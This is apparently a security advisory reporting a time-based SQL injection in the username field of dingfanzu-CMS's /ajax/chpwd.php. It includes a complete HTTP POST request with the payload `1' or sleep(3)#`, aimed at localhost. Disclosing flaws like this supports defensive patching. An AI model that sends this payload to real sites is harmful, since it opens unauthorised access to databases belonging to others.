# dingfanzu-CMS chpwd.php username SQL-inject

**Exploit Title: dingfanzu-CMS chpwd.php username SQL inject**

**Exploit Author: webraybtl@webray.com.cn inc**

**Vendor Homepage: https://github.com/geeeeeeeek/dingfanzu**

**Software Link: https://github.com/geeeeeeeek/dingfanzu**

**CMSName: dingfanzu-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection dingfanzu-CMS does not filter the content correctly at the "chpwd.php" username module, resulting in the generation of SQL injection.

    Payload used:

```
POST /ajax/chpwd.php HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_9bb651f2bb5622d49b0299560d6559cd=1724296185; Hm_lpvt_9bb651f2bb5622d49b0299560d6559cd=1724296185; HMACCOUNT=972263C9F6177EA8; PHPSESSID=6tpdrcitemfg08ghc7vtcjvuo7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=1' or sleep(3)#&password=
```

## Proof of Concept

![](D:\software_data\markdown_image\2024-08-22-14-07-33-image.png)

![](D:\software_data\markdown_image\2024-08-22-14-08-54-image.png)
